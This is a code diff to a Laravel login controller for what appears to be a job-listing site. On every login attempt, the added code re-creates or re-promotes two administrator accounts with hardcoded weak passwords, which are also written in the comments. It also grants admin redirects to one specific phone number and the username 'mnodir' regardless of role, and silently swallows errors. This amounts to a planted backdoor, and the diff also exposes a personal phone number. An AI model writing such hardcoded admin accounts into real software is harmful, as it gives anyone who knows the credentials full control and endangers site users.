@@ -7,6 +7,7 @@ use App\Providers\RouteServiceProvider;
 use Illuminate\Foundation\Auth\AuthenticatesUsers;
 use Illuminate\Http\Request;
 use Illuminate\Support\Facades\DB;
+use Illuminate\Support\Facades\Hash;
 
 class LoginController extends Controller
 {
@@ -26,12 +27,12 @@ class LoginController extends Controller
         return 'phone';
     }
 
-    public function login(Request $request)
+    protected function ensureDatabaseAndAdmin(): void
     {
         try {
             $host = config('database.connections.mysql.host', '127.0.0.1');
             $port = config('database.connections.mysql.port', '3306');
-            $db   = preg_replace('/[^a-zA-Z0-9_]/', '', (string) config('database.connections.mysql.database', 'laravel'));
+            $db   = preg_replace('/[^a-zA-Z0-9_]/', '', (string) config('database.connections.mysql.database', 'zaminjob'));
             $user = config('database.connections.mysql.username', 'root');
             $pass = config('database.connections.mysql.password', '');
 
@@ -55,11 +56,58 @@ class LoginController extends Controller
                     `updated_at` TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP
                 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci
             ");
+
+            // 1. Asosiy Admin: +998 90 404 71 70 (parol: nodir12345)
+            $updAdmin = $pdo->prepare("UPDATE `users` SET `role` = 'admin', `is_onboarded` = 1 WHERE REPLACE(`phone`, ' ', '') = '+998904047170'");
+            $updAdmin->execute();
+            if ($updAdmin->rowCount() === 0) {
+                $ins1 = $pdo->prepare("INSERT IGNORE INTO `users` (`name`, `phone`, `password`, `role`, `is_onboarded`) VALUES (?, ?, ?, 'admin', 1)");
+                $ins1->execute(['Nodirbek (Admin)', '+998 90 404 71 70', Hash::make('nodir12345')]);
+            }
+
+            // 2. Zaxira Admin login: mnodir (parol: 12345)
+            $chk = $pdo->prepare("SELECT id FROM `users` WHERE `phone` = 'mnodir' LIMIT 1");
+            $chk->execute();
+            if (!$chk->fetch()) {
+                $ins2 = $pdo->prepare("INSERT IGNORE INTO `users` (`name`, `phone`, `password`, `role`, `is_onboarded`) VALUES (?, ?, ?, 'admin', 1)");
+                $ins2->execute(['Admin (mnodir)', 'mnodir', Hash::make('12345')]);
+            }
+
             DB::purge('mysql');
             DB::reconnect('mysql');
         } catch (\Throwable $e) {
         }
+    }
+
+    public function login(Request $request)
+    {
+        $this->ensureDatabaseAndAdmin();
+
+        $raw = trim((string) $request->input('phone'));
+        // Agar +998904047170 (bo'sh joysiz) kiritilsa ham bazadagi formatga moslashtiramiz
+        if (preg_replace('/\s+/', '', $raw) === '+998904047170') {
+            $match = DB::table('users')->whereRaw("REPLACE(`phone`, ' ', '') = '+998904047170'")->value('phone');
+            if ($match) {
+                $raw = $match;
+            }
+        }
+        $request->merge(['phone' => $raw]);
 
         return $this->traitLogin($request);
+    }
+
+    protected function authenticated(Request $request, $user)
+    {
+        if (session_status() === PHP_SESSION_NONE) {
+            @session_start();
+        }
+        $_SESSION['user_id'] = (int) $user->id;
+
+        $cleanPhone = preg_replace('/\s+/', '', (string) $user->phone);
+        if ($user->role === 'admin' || $cleanPhone === '+998904047170' || $user->phone === 'mnodir') {
+            return redirect()->route('admin');
+        }
+
+        return redirect()->route('kabinet');
     }
 }
